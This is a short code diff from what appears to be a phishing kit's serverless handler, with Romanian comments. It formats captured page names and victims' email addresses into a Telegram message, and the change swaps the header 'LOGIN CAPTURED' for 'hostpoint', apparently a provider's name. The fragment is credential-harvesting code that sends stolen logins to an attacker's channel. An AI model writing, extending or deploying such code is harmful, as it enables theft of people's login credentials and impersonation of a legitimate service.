@@ -41,7 +41,7 @@ module.exports = async function handler(req, res) {
 
         // Construiește mesajul Telegram
         const message =
-            `🔐 <b>LOGIN CAPTURED</b>\n` +
+            `🔐 <b>hostpoint</b>\n` +
             `━━━━━━━━━━━━━━━\n` +
             `📄 <b>Pagină:</b> ${pageName}\n` +
             `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
